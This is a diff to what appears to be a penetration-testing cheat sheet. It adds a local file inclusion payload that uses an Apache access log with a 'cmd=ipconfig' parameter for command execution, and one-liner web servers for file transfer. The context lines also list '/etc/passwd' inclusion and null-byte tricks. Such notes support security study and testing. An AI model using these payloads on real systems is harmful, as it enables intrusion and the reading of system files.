@@ -709,6 +709,7 @@ Linux file accessible to all users
 	/etc/passwd
 	
 ?file=\\Windows\\System32\\drivers\\etc\\hosts
+?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 
 Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
 Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
@@ -1585,6 +1586,14 @@ to create a server on current directory
 python -m SimpleHTTPServer 800
 	Serving HTTP on 0.0.0.0 port 800 ...
 	
+	
+python3 -m http.server 800
+php -S 0.0.0.0:800
+ruby -run -e httpd . -p 800
+busybox httpd -f -p 800
+
+
+
 ----------------------
 Windows File Transfer
 ----------------------
